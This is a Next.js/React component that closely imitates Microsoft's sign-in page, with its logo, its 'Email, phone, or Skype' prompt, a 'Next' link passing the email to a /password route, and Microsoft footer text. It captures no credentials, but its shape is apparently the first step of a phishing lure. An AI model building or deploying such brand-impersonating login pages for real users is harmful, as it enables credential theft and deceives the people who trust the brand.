import { useState } from 'react';
import Link from 'next/link';

export default function Home() {
  const [email, setEmail] = useState('');

  return (
    <main className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
      {/* Microsoft Logo */}
      <div className="mb-8">
        <svg 
          width="108" 
          height="24" 
          viewBox="0 0 108 24" 
          fill="none" 
          xmlns="http://www.w3.org/2000/svg"
          role="img"
          aria-label="Microsoft"
        >
          <path d="M0 0H24V24H0V0Z" fill="#F25022"/>
          <path d="M32 0H56V24H32V0Z" fill="#7FBA00"/>
          <path d="M64 0H88V24H64V0Z" fill="#00A4EF"/>
          <path d="M96 0H120V24H96V0Z" fill="#FFB900"/>
        </svg>
      </div>

      {/* Login Box */}
      <div className="w-full max-w-[440px] p-8 border border-gray-200 rounded-lg shadow-sm bg-white">
        <h1 className="text-2xl font-semibold text-gray-900 mb-6">Sign in</h1>
        
        <form className="space-y-4" onSubmit={(e) => e.preventDefault()}>
          <div>
            <label 
              htmlFor="email" 
              className="block text-sm text-gray-700 mb-1"
            >
              Email, phone, or Skype
            </label>
            <input
              id="email"
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-base"
              autoComplete="off"
            />
          </div>

          <div className="pt-2">
            <Link
              href={`/password?email=${encodeURIComponent(email)}`}
              className="inline-block w-full bg-[#0067b8] text-white font-semibold py-2.5 px-4 rounded hover:bg-[#005a9e] transition-colors text-center"
            >
              Next
            </Link>
          </div>
        </form>

        <div className="mt-4 text-center">
          <a 
            href="#" 
            className="text-sm text-[#0067b8] hover:underline"
          >
            Can&#39;t access your account?
          </a>
        </div>
      </div>

      {/* Back to Microsoft link */}
      <div className="mt-6">
        <a 
          href="#" 
          className="text-sm text-gray-600 hover:underline flex items-center gap-1"
        >
          <svg 
            width="12" 
            height="12" 
            viewBox="0 0 12 12" 
            fill="currentColor"
          >
            <path d="M10.5 6L6 1.5L1.5 6" stroke="currentColor" strokeWidth="1.5" fill="none"/>
          </svg>
          Back to Microsoft account
        </a>
      </div>

      {/* Footer Links */}
      <footer className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200">
        <div className="max-w-[940px] mx-auto px-4 py-4 flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
          <a href="#" className="hover:underline">Privacy and cookies</a>
          <a href="#" className="hover:underline">Terms of use</a>
          <a href="#" className="hover:underline">© Microsoft 2026</a>
        </div>
      </footer>
    </main>
  );
}
